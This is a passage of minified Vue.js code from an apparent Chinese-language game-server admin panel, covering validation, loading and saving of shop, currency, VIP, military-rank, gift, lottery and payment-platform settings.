i={line:t+1,contents:[]};e.levelId&&e.levelId.length||i.contents.push("等级ID不能为空"),e.level&&e.level.length||i.contents.push("等级名称不能为空"),e.prices&&e.prices.length||i.contents.push("价格策略不能为空"),e.prices.forEach((function(e,t){("number"!=typeof e.validDays||e.validDays<0)&&i.contents.push("第".concat(t+1,"个有效天数不能为空")),("number"!=typeof e.price||e.price<0)&&i.contents.push("第".concat(t+1,"个价格不能为空"))})),i.contents.length&&n.push(i)})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"行：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("请正确填写军衔等级配置"))):a()}else a()}}],ResourceRecycleConfigs:[{required:!0,trigger:"change",message:"请正确填写物资回收设置",validator:function(t,i,a){if(i&&i.length){var n=[];i.forEach((function(t,i){var a={line:i+1,contents:[]};t.title&&t.title.length||a.contents.push("回收类型名称不能为空"),t.items&&t.items.length||a.contents.push("目标物品不能为空"),t.items.forEach((function(e,t){e.type&&e.type.length||a.contents.push("第".concat(t+1,"个物品指令名称不能为空")),("number"!=typeof e.number||e.number<0)&&a.contents.push("第".concat(t+1,"个物品数量不能为空"))})),t.actions&&t.actions.length||a.contents.push("动作不能为空"),t.actions.forEach((function(t,i){"command"===t.configType?"boolean"!=typeof t.isTeleport?a.contents.push("第".concat(i+1,"个发放方式不能为空")):!1!==t.isTeleport||t.noTeleportMode.length?t.commands&&t.commands.length||a.contents.push("第".concat(i+1,"个生成命令不能为空")):a.contents.push("第".concat(i+1,"个发放方式为隔空时刷货格式不能为空")):"dollar"===t.configType?("number"!=typeof t.dollar||t.dollar<0)&&a.contents.push("第".concat(i+1,"个赠送美金不能为空且应≥0")):"vip"===t.configType?e.levelList&&e.levelList.length&&void 0!==e.levelList.find((function(e){return e===t.level}))?("number"!=typeof t.levelExpireDays||t.levelExpireDays<0)&&a.contents.push("第".concat(i+1,"个会员有效天数不能为空且应≥0(等于0视为永久有效)")):a.contents.push("第".concat(i+1,"个请选择存在的会员等级")):"military"===t.configType&&(e.militaryLevelList&&e.militaryLevelList.length&&void 0!==e.militaryLevelList.find((function(e){return e.levelId===t.militaryLevelId}))?("number"!=typeof t.militaryLevelExpireDays||t.militaryLevelExpireDays<0)&&a.contents.push("第".concat(i+1,"个军衔有效天数不能为空且应≥0(等于0视为永久有效)")):a.contents.push("第".concat(i+1,"个请选择存在的军衔等级")))})),a.contents.length&&n.push(a)})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"行：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("请正确填写物资回收设置"))):a()}else a()}}],AutoRenameRegisteredPlayers:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableAutoAsyncServerAdminSteamIdConfigs:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],ServerAdminSteamIdConfigsContent:[{required:!0,trigger:"change",message:"服务器管理员配置内容的Steam ID不能为空",validator:function(t,i,a){if(i&&i.length){var n=[];i.forEach((function(e,t){if(!/^\d{17}$/.test(e.steamId)){var i={line:t+1,contents:[]};i.contents.push("Steam ID应为17位数字"),n.push(i)}})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"项：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("服务器管理员配置内容的Steam ID不能为空"))):a()}else a()}}],TeleportLimitaions:[{required:!0,trigger:"change",message:"请正确填写传送限制策略",validator:function(t,i,a){if(i&&i.length){var n=[];i.forEach((function(e,t){var i={line:t+1,contents:[]};e.type&&e.type.length||i.contents.push("限制类型为空"),e.vips&&e.vips.length||i.contents.push("VIP适用范围不能为空"),e.ranges&&e.ranges.length||i.contents.push("坐标范围不能为空"),e.ranges.forEach((function(e,t){var a,n,r,o;"number"==typeof(null==e||null===(a=e.fromXY)||void 0===a?void 0:a.x)&&"number"==typeof(null==e||null===(n=e.fromXY)||void 0===n?void 0:n.y)&&"number"==typeof(null==e||null===(r=e.toXY)||void 0===r?void 0:r.x)&&"number"==typeof(null==e||null===(o=e.toXY)||void 0===o?void 0:o.y)||i.contents.push("第".concat(t+1,"个坐标范围X,Y坐标应为合法数字"))})),i.contents.length&&n.push(i)})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"行：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("请正确填写传送限制策略"))):a()}else a()}}]},enableSafezoneBuy:!0,loadingRefreshServerAdminSteamIdConfigs:!1,expander:{AdvancedUserChargeConfigs:!0,InnerModeConfigs:!0,InnerModeShortCutConfigs:!0,InnerModeDiyFaqConfigs:!0,ThirdPartyRobotUidConfigs:!0,VehicleEnsuranceConfigs:!0,HotPointTeleportPoint:!0,UserMonitorsConfigRobots:!0,UserMonitorsConfigLocations:!0,ServerSafeZones:!0,StoreRandomPrizePool:!0,NDayGiftConfig:!0,NDayGiftFeeConfigs:!0,LotteryConfigs:!0,AchieveGiftConfigs:!0,BuyArtifactRightMonitor:!0,ServerAdminSteamIdConfigsContent:!0,MilitaryLevelConfigs:!0,ResourceRecycleConfigs:!0,TeleportLimitaions:!0}}},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.getLevelList();case 2:return t.next=4,e.getData();case 4:case"end":return t.stop()}}),t)})))()},methods:{hasDuplicateLevel:function(e){var t,i=new Set,a=Object(we.a)(e);try{for(a.s();!(t=a.n()).done;){var n=t.value;if(i.has(n.level))return!0;i.add(n.level)}}catch(e){a.e(e)}finally{a.f()}return!1},processNumber:function(e,t){this.$set(this.settingsForm.StoreRandomPrizePool[t],"rate",e===parseInt(e)?e:Number(Number(e).toFixed(2)))},handleSearchSetItemName:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t,i){var a,n;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,a={keyword:t},e.next=4,f({method:"GET",url:"/itemAdminSys/searchSet",params:a});case 4:200===(n=e.sent).status&&this.$set(i,"itemList",n.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,this,[[0,8]])})));return function(t,i){return e.apply(this,arguments)}}(),500),getLevelList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/levelAdminSys/list",params:{pageSize:99999,pageNum:1}});case 3:200===(i=t.sent).status&&(e.levelList=i.data.list.map((function(e){return e.level}))),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},getData:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.loading=!0,t.prev=1,t.next=4,f({method:"GET",url:"/serverConfigAdminSys/dollarsSettings"});case 4:i=t.sent,e.loading=!1,200===i.status&&(i.data.AdvancedUserChargeConfigs=i.data.AdvancedUserChargeConfigs.map((function(e){var t;return(null===(t=e.sets)||void 0===t?void 0:t.length)>0&&(e.sets=e.sets.map((function(e){return e.itemList=[{id:e.itemId,name:e.itemName}],e}))),e})),i.data.StoreLuckyPrizeControl=i.data.StoreLuckyPrizeControl.join(","),i.data.BuyArtifactRightMonitor=i.data.BuyArtifactRightMonitor.map((function(e){return e.timestampStart=R()(e.timestampStart),e.timestampEnd=R()(e.timestampEnd),e})),i.data.ServerAdminSteamIdConfigsContent=i.data.ServerAdminSteamIdConfigsContent.map((function(e){return e.EnableAutoAsyncServerAdminSteamIdConfigs="boolean"==typeof e.EnableAutoAsyncServerAdminSteamIdConfigs&&e.EnableAutoAsyncServerAdminSteamIdConfigs,e.expireTimeStamp=null===e.expireTimeStamp?null:R()(e.expireTimeStamp),e})),i.data.VehicleEnsuranceConfigs=i.data.VehicleEnsuranceConfigs.map((function(e){return e.limitedItemIds instanceof Array!=!0&&(e.limitedItemIds=[]),e})),i.data.HotPointTeleportPoint=i.data.HotPointTeleportPoint.map((function(e){return"string"==typeof e.location&&(e.location=[e.location,e.location]),e})),i.data.ServerSafeZones=i.data.ServerSafeZones.map((function(e){return e.expireTimeStamp=e.expireTimeStamp?R()(parseInt(e.expireTimeStamp)):null,e})),i.data.StoreRandomPrizePool=i.data.StoreRandomPrizePool.map((function(e){return e.showUploadConfig=!1,e.rate=void 0!==e.rate&&null!==e.rate&&e.rate>=0?e.rate:0,e.imgSrc=e.imgSrc&&e.imgSrc.length?e.imgSrc:"",e.sendType=e.sendType&&e.sendType.length?e.sendType:"immediate",e.isTeleport="boolean"!=typeof e.isTeleport||e.isTeleport,e.noTeleportMode=e.noTeleportMode&&e.noTeleportMode.length?e.noTeleportMode:"mode1",e.isNoPrize="boolean"==typeof e.isNoPrize&&e.isNoPrize,e})),i.data.NDayGiftConfig=i.data.NDayGiftConfig.map((function(e){return e.showUploadConfig=!1,e.configType=e.configType&&e.configType.length?e.configType:"command",e.imgSrc=e.imgSrc&&e.imgSrc.length?e.imgSrc:"",e.sendType=e.sendType&&e.sendType.length?e.sendType:"immediate",e.isTeleport="boolean"!=typeof e.isTeleport||e.isTeleport,e.noTeleportMode=e.noTeleportMode&&e.noTeleportMode.length?e.noTeleportMode:"mode1",e})),i.data.NDayGiftFeeConfigs=i.data.NDayGiftFeeConfigs.map((function(e){return e.configs=e.configs.map((function(e){return e.showUploadConfig=!1,e.configType=e.configType&&e.configType.length?e.configType:"command",e.imgSrc=e.imgSrc&&e.imgSrc.length?e.imgSrc:"",e.sendType=e.sendType&&e.sendType.length?e.sendType:"immediate",e.isTeleport="boolean"!=typeof e.isTeleport||e.isTeleport,e.noTeleportMode=e.noTeleportMode&&e.noTeleportMode.length?e.noTeleportMode:"mode1",e})),e})),i.data.LotteryConfigs=i.data.LotteryConfigs.map((function(e){return e.ruleType=e.ruleType&&e.ruleType.length?e.ruleType:"guess",e.drawType=e.drawType&&e.drawType.length?e.drawType:"loot",e.lootCycle=e.lootCycle=e.lootCycle&&e.lootCycle.length?e.lootCycle:"day",e.drawDate="number"==typeof e.drawDate?R()(e.drawDate):null,e.enableMulti="boolean"==typeof e.enableMulti&&e.enableMulti,e})),i.data.AchieveGiftConfigs=i.data.AchieveGiftConfigs.map((function(e,t){return e.showUploadConfig=!1,e.id="number"==typeof e.id&&e.id>0?e.id:t,e.name=e.name&&e.name.length?e.name:"",e.value="number"==typeof e.value&&e.value>0?e.value:1,e.configType=e.configType&&e.configType.length?e.configType:"command",e.type=e.type&&e.type.length?e.type:"",e.imgSrc=e.imgSrc&&e.imgSrc.length?e.imgSrc:"",e.isTeleport="boolean"!=typeof e.isTeleport||e.isTeleport,e.noTeleportMode=e.noTeleportMode&&e.noTeleportMode.length?e.noTeleportMode:"mode1",e})),i.data.LHDConfigs.leopardWinMultiples="number"==typeof i.data.LHDConfigs.leopardWinMultiples&&i.data.LHDConfigs.leopardWinMultiples>=1?i.data.LHDConfigs.leopardWinMultiples:1,i.data.MilitaryLevelConfigs=i.data.MilitaryLevelConfigs.map((function(e){return e.prices=e.prices.map((function(e){return e.price="number"==typeof e.price&&e.price>=0?e.price:0,e.validDays="number"==typeof e.validDays&&e.validDays>=0?Number(Math.floor(e.validDays)):0,e})),e})),i.data.ResourceRecycleConfigs=i.data.ResourceRecycleConfigs.map((function(e){return e.items=e.items.map((function(e){return e.number="number"==typeof e.price&&e.number>=1?e.number:1,e})),e.actions=e.actions.map((function(e){return e.number="number"==typeof e.price&&e.number>=1?e.number:1,e.configType=e.configType&&e.configType.length?e.configType:"command","command"===e.configType&&(e.type=e.type&&e.type.length?e.type:"",e.imgSrc=e.imgSrc&&e.imgSrc.length?e.imgSrc:"",e.isTeleport="boolean"!=typeof e.isTeleport||e.isTeleport,e.noTeleportMode=e.noTeleportMode&&e.noTeleportMode.length?e.noTeleportMode:"mode1"),e})),e})),e.$set(e,"militaryLevelList",i.data.MilitaryLevelConfigs.map((function(e){return{levelId:e.levelId,level:e.level}}))),e.$set(e,"settingsForm",i.data)),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.loading=!1;case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},onChangeGiftConfigType:function(e,t){"command"===t?(this.$set(this.settingsForm.NDayGiftConfig[e],"sendType","immediate"),this.$set(this.settingsForm.NDayGiftConfig[e],"isTeleport",!0),this.$set(this.settingsForm.NDayGiftConfig[e],"noTeleportMode","mode1"),this.$set(this.settingsForm.NDayGiftConfig[e],"commands",""),delete this.settingsForm.NDayGiftConfig[e].dollar,delete this.settingsForm.NDayGiftConfig[e].level,delete this.settingsForm.NDayGiftConfig[e].levelExpireDays,delete this.settingsForm.NDayGiftConfig[e].militaryLevelId,delete this.settingsForm.NDayGiftConfig[e].militaryLevelExpireDays):"dollar"===t?(this.$set(this.settingsForm.NDayGiftConfig[e],"dollar",0),delete this.settingsForm.NDayGiftConfig[e].sendType,delete this.settingsForm.NDayGiftConfig[e].isTeleport,delete this.settingsForm.NDayGiftConfig[e].noTeleportMode,delete this.settingsForm.NDayGiftConfig[e].commands,delete this.settingsForm.NDayGiftConfig[e].level,delete this.settingsForm.NDayGiftConfig[e].levelExpireDays,delete this.settingsForm.NDayGiftConfig[e].militaryLevelId,delete this.settingsForm.NDayGiftConfig[e].militaryLevelExpireDays):"vip"===t?(this.$set(this.settingsForm.NDayGiftConfig[e],"level",null),this.$set(this.settingsForm.NDayGiftConfig[e],"levelExpireDays",0),delete this.settingsForm.NDayGiftConfig[e].sendType,delete this.settingsForm.NDayGiftConfig[e].isTeleport,delete this.settingsForm.NDayGiftConfig[e].noTeleportMode,delete this.settingsForm.NDayGiftConfig[e].commands,delete this.settingsForm.NDayGiftConfig[e].dollar,delete this.settingsForm.NDayGiftConfig[e].militaryLevelId,delete this.settingsForm.NDayGiftConfig[e].militaryLevelExpireDays):"military"===t&&(this.$set(this.settingsForm.NDayGiftConfig[e],"militaryLevelId",null),this.$set(this.settingsForm.NDayGiftConfig[e],"militaryLevelExpireDays",0),delete this.settingsForm.NDayGiftConfig[e].sendType,delete this.settingsForm.NDayGiftConfig[e].isTeleport,delete this.settingsForm.NDayGiftConfig[e].noTeleportMode,delete this.settingsForm.NDayGiftConfig[e].commands,delete this.settingsForm.NDayGiftConfig[e].dollar,delete this.settingsForm.NDayGiftConfig[e].level,delete this.settingsForm.NDayGiftConfig[e].levelExpireDays)},onChangeGiftConfigTypeSpecial:function(e,t,i){"command"===i?(this.$set(this.settingsForm.NDayGiftFeeConfigs[e].configs[t],"sendType","immediate"),this.$set(this.settingsForm.NDayGiftFeeConfigs[e].configs[t],"isTeleport",!0),this.$set(this.settingsForm.NDayGiftFeeConfigs[e].configs[t],"noTeleportMode","mode1"),this.$set(this.settingsForm.NDayGiftFeeConfigs[e].configs[t],"commands",""),delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].dollar,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].level,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].levelExpireDays,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].militaryLevelId,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].militaryLevelExpireDays):"dollar"===i?(this.$set(this.settingsForm.NDayGiftFeeConfigs[e].configs[t],"dollar",0),delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].sendType,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].isTeleport,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].noTeleportMode,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].commands,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].level,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].levelExpireDays,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].militaryLevelId,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].militaryLevelExpireDays):"vip"===i?(this.$set(this.settingsForm.NDayGiftFeeConfigs[e].configs[t],"level",null),this.$set(this.settingsForm.NDayGiftFeeConfigs[e].configs[t],"levelExpireDays",0),delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].sendType,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].isTeleport,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].noTeleportMode,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].commands,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].dollar,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].militaryLevelId,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].militaryLevelExpireDays):"military"===i&&(this.$set(this.settingsForm.NDayGiftFeeConfigs[e].configs[t],"militaryLevelId",null),this.$set(this.settingsForm.NDayGiftFeeConfigs[e].configs[t],"militaryLevelExpireDays",0),delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].sendType,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].isTeleport,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].noTeleportMode,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].commands,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].dollar,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].level,delete this.settingsForm.NDayGiftFeeConfigs[e].configs[t].levelExpireDays)},onChangeLotteryDrawType:function(e,t){("loot"===t||"once"===t)&&(this.$set(this.settingsForm.LotteryConfigs[e],"lootCycle","day"),this.$set(this.settingsForm.LotteryConfigs[e],"drawDate",null))},onChangeAchieveGiftType:function(e,t){"lockPickTime"===t||"lockPickUsedTime"===t||"defusalTime"===t||"defusalUsedTime"===t?this.$set(this.settingsForm.AchieveGiftConfigs[e],"lockType",""):this.$set(this.settingsForm.AchieveGiftConfigs[e],"lockType",void 0)},onChangeAchieveGiftConfigType:function(e,t){"command"===t?(this.$set(this.settingsForm.AchieveGiftConfigs[e],"isTeleport",!0),this.$set(this.settingsForm.AchieveGiftConfigs[e],"noTeleportMode","mode1"),this.$set(this.settingsForm.AchieveGiftConfigs[e],"commands",""),delete this.settingsForm.AchieveGiftConfigs[e].dollar,delete this.settingsForm.AchieveGiftConfigs[e].level,delete this.settingsForm.AchieveGiftConfigs[e].levelExpireDays,delete this.settingsForm.AchieveGiftConfigs[e].militaryLevelId,delete this.settingsForm.AchieveGiftConfigs[e].militaryLevelExpireDays):"dollar"===t?(this.$set(this.settingsForm.AchieveGiftConfigs[e],"dollar",0),delete this.settingsForm.AchieveGiftConfigs[e].isTeleport,delete this.settingsForm.AchieveGiftConfigs[e].noTeleportMode,delete this.settingsForm.AchieveGiftConfigs[e].commands,delete this.settingsForm.AchieveGiftConfigs[e].level,delete this.settingsForm.AchieveGiftConfigs[e].levelExpireDays,delete this.settingsForm.AchieveGiftConfigs[e].militaryLevelId,delete this.settingsForm.AchieveGiftConfigs[e].militaryLevelExpireDays):"vip"===t?(this.$set(this.settingsForm.AchieveGiftConfigs[e],"level",null),this.$set(this.settingsForm.AchieveGiftConfigs[e],"levelExpireDays",0),delete this.settingsForm.AchieveGiftConfigs[e].isTeleport,delete this.settingsForm.AchieveGiftConfigs[e].noTeleportMode,delete this.settingsForm.AchieveGiftConfigs[e].commands,delete this.settingsForm.AchieveGiftConfigs[e].dollar,delete this.settingsForm.AchieveGiftConfigs[e].militaryLevelId,delete this.settingsForm.AchieveGiftConfigs[e].militaryLevelExpireDays):"military"===t&&(this.$set(this.settingsForm.AchieveGiftConfigs[e],"militaryLevelId",null),this.$set(this.settingsForm.AchieveGiftConfigs[e],"militaryLevelExpireDays",0),delete this.settingsForm.AchieveGiftConfigs[e].sendType,delete this.settingsForm.AchieveGiftConfigs[e].isTeleport,delete this.settingsForm.AchieveGiftConfigs[e].noTeleportMode,delete this.settingsForm.AchieveGiftConfigs[e].commands,delete this.settingsForm.AchieveGiftConfigs[e].dollar,delete this.settingsForm.AchieveGiftConfigs[e].level,delete this.settingsForm.AchieveGiftConfigs[e].levelExpireDays)},onClickEdit:function(){this.show=!0,this.edit=!0},onClickCancelEdit:function(){this.edit=!1,this.getData()},onClickSave:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.settingsForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=34;break}return(a=Object(A.cloneDeep)(e.settingsForm)).AdvancedUserChargeConfigs=a.AdvancedUserChargeConfigs.map((function(e){var t;return null!==(t=e.sets)&&void 0!==t&&t.length&&(e.sets=e.sets.map((function(e){return delete e.itemList,e}))),e})),a.UserMonitorsConfig.locations=a.UserMonitorsConfig.locations.map((function(e){return e.configs.each=e.configs.purchaseLimitOn?e.configs.each:"",e.configs.time=e.configs.purchaseLimitOn?e.configs.time:null,e})),a.ServerSafeZones=a.ServerSafeZones.map((function(e){return e.expireTimeStamp&&(e.expireTimeStamp=R()(e.expireTimeStamp).valueOf()),e})),a.StoreRandomPrizePool=a.StoreRandomPrizePool.map((function(e){return delete e.showUploadConfig,delete e.timestampStart,delete e.timestampEnd,e})),a.NDayGiftConfig=a.NDayGiftConfig.map((function(e){return delete e.showUploadConfig,delete e.timestampStart,delete e.timestampEnd,e})),a.NDayGiftFeeConfigs=a.NDayGiftFeeConfigs.map((function(e){return e.configs=e.configs.map((function(e){return delete e.showUploadConfig,delete e.timestampStart,delete e.timestampEnd,e})),e})),a.LotteryConfigs=a.LotteryConfigs.map((function(e){return void 0!==e.drawDate&&null!==e.drawDate&&(e.drawDate=e.drawDate.valueOf()),e})),a.AchieveGiftConfigs=a.AchieveGiftConfigs.map((function(e){return delete e.showUploadConfig,delete e.timestampStart,delete e.timestampEnd,e})),a.StoreLuckyPrizeControl=a.StoreLuckyPrizeControl.split(",").filter((function(e){return!(""===e||null==e)})).map((function(e){return parseInt(e)})),a.BuyArtifactRightMonitor=a.BuyArtifactRightMonitor.map((function(e){return e.timestampStart=R()(e.timestampStart).valueOf(),e.timestampEnd=R()(e.timestampEnd).valueOf(),e})),a.ServerAdminSteamIdConfigsContent=a.ServerAdminSteamIdConfigsContent.map((function(e){return e.expireTimeStamp=R()(e.expireTimeStamp).valueOf(),e})),a.EnableRandomPrizeDollarPurchase||(a.RandomPrizePrice=0,a.RandomPrizePrice10=0),a.EnableInnerMode||(a.EnableInnerModeSimpleSignup=!1),a.EnableAutoAsyncServerAdminSteamIdConfigs||(a.ServerAdminSteamIdConfigsPath=a.ServerAdminSteamIdConfigsPath||"/"),console.log(a),e.saveLoading=!0,t.prev=18,t.next=21,f({method:"PUT",url:e.userInfo&&"sysAdmin"===e.userInfo.role?"/serverConfigAdminSys/updateAllDollarsSettings":"/serverConfigAdminSys/updateDollarsSettings",data:a});case 21:if(n=t.sent,e.saveLoading=!1,200!==n.status){t.next=28;break}return e.$message.success("修改成功"),e.edit=!1,t.next=28,e.getData();case 28:t.next=34;break;case 30:t.prev=30,t.t0=t.catch(18),console.error(t.t0),e.saveLoading=!1;case 34:case"end":return t.stop()}}),t,null,[[18,30]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},refreshServerAdminSteamIdConfigs:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.loadingRefreshServerAdminSteamIdConfigs=!0,t.next=4,f({method:"POST",url:"/serverConfigAdminSys/refreshServerAdminSteamIdConfigs"});case 4:200===t.sent.status&&(e.loadingRefreshServerAdminSteamIdConfigs=!1,e.$message.success("上传成功"),e.onClickCancelEdit()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.loadingRefreshServerAdminSteamIdConfigs=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}}),Ra=(i("8bf4"),Object(S.a)(Fa,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"auto",position:"relative",background:"white"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 80px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[i("span",[e._v("商城和美金设置")]),e.edit?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"sync"},on:{click:e.getData}},[e._v("刷新")]),e.loading?e._e():[e.edit||!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"edit"},on:{click:e.onClickEdit}},[e._v("编辑")]),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"primary",size:"small",icon:"edit",loading:e.saveLoading},on:{click:e.onClickSave}},[e._v("保存 ")]):e._e(),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"close",disabled:e.saveLoading},on:{click:e.onClickCancelEdit}},[e._v("取消 ")]):e._e()]],2),i("a-button",{staticStyle:{float:"right",width:"70px"},attrs:{icon:e.show?"minus":"plus",size:"small",type:"primary"},on:{click:function(t){e.show=!e.show}}},[e._v(e._s(e.show?"收起":"展开")+" ")])],1),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("transition",{attrs:{name:"fade"}},[i("div",{directives:[{name:"show",rawName:"v-show",value:e.show,expression:"show"}],staticStyle:{width:"100%","min-height":"750px",position:"relative",background:"white","overflow-y":"auto"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[e.loading?e._e():i("a-form-model",{ref:"settingsForm",staticStyle:{"max-width":"780px"},attrs:{model:e.settingsForm,rules:e.settingsFormRules,"label-col":{span:7},"wrapper-col":{span:17}}},[i("a-form-model-item",{attrs:{label:"每一元能兑换的美金数额",prop:"DollarPerRmb"}},[i("a-input-number",{attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.DollarPerRmb,callback:function(t){e.$set(e.settingsForm,"DollarPerRmb",t)},expression:"settingsForm.DollarPerRmb"}}),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"primary"},on:{click:function(){e.window.open("https://epay.cocoafaka.com","_blank")}}},[e._v("跳转到推荐充值平台进行配置")])],1),i("a-form-model-item",{attrs:{prop:"ChargePayPid"}},[i("template",{slot:"label"},[i("span",[e._v("充值平台PID")]),i("a-tooltip",{attrs:{placement:"top",title:"目前支持的是易支付框架，需要接入自动充值请百度一下易支付自行注册，充值支付额度使用，第三方平台风险自负"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-input",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.ChargePayPid,callback:function(t){e.$set(e.settingsForm,"ChargePayPid",t)},expression:"settingsForm.ChargePayPid"}})],2),i("a-form-model-item",{attrs:{prop:"ChargePayKey"}},[i("template",{slot:"label"},[i("span",[e._v("充值平台KEY")]),i("a-tooltip",{attrs:{placement:"top",title:"目前支持的是易支付框架，需要接入自动充值请百度一下易支付自行注册，充值支付额度使用，第三方平台风险自负"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-input",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.ChargePayKey,callback:function(t){e.$set(e.settingsForm,"ChargePayKey",t)},expression:"settingsForm.ChargePayKey"}})],2),i("a-form-model-item",{attrs:{prop:"ChargePayAPI"}},[i("template",{slot:"label"},[i("span",[e._v("充值平台跳转地址")]),i("a-tooltip",{attrs:{placement:"top",title:"目前支持的是易支付框架，需要接入自动充值请百度一下易支付自行注册，充值支付额度使用，第三方平台风险自负"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-input",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.ChargePayAPI,callback:function(t){e.$set(e.settingsForm,"ChargePayAPI",t)},expression:"settingsForm.ChargePayAPI"}})],2),i("a-form-model-item",{attrs:{label:"仅充值购买套餐设置",prop:"AdvancedUserChargeConfigs"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.AdvancedUserChargeConfigs.push({typeGroup:"",desc:"",price:0,check:{dollar:!1,vip:!1,military:!1,sets:!1},dollar:null,vip:{},military:{},sets:{}})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.AdvancedUserChargeConfigs?"up":"down"},on:{click:function(){e.$set(e.expander,"AdvancedUserChargeConfigs",!e.expander.AdvancedUserChargeConfigs)}}},[e._v(e._s(e.expander.AdvancedUserChargeConfigs?"隐藏":"显示"))]),void 0!==e.settingsForm.AdvancedUserChargeConfigs&&e.settingsForm.AdvancedUserChargeConfigs.length&&e.expander.AdvancedUserChargeConfigs?i("div",{staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},e._l(e.settingsForm.AdvancedUserChargeConfigs,(function(t,a){return 